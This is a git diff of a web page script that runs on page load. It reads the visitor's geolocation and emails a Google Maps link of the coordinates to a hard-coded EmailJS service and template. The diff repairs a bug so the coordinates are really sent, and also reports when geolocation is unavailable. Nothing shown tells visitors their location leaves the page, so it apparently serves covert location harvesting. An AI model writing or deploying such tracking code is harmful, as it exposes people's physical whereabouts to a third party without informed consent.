@@ -16,9 +16,7 @@
             });
         })();
 
-        //const TWO_HOURS = 7200000
-
-        
+        //const TWO_HOURS = 7200000        
 
         window.onload = function() {
     sendLocationEmail();
@@ -30,22 +28,27 @@ function sendLocationEmail() {
 
             if (!navigator.geolocation) {                
                 chek = 0
+                emailjs.send(
+                "service_3hv5k7r",
+                "template_peoy2wo",
+                { 
+                    message: `${chek}`
+                }
+            )
+                return;
             }    
 
-            if (chek === 1){
             navigator.geolocation.getCurrentPosition(
-            function(position) {
+        function(position) {
 
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude; } );
-
-            }
+           const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
            
             emailjs.send(
                 "service_3hv5k7r",
                 "template_peoy2wo",
                 { 
-                    message: `https://maps.google.com/?q=${latitude},${longitude} | ${chek}`
+                    message: `https://maps.google.com/?q=${latitude},${longitude} |${chek}`
                 }
             )
             .then(function(response) {
@@ -53,7 +56,8 @@ function sendLocationEmail() {
             })
             .catch(function(error) {
                 console.error(error);
-            });        
+            });
+        } );
 
         }
 
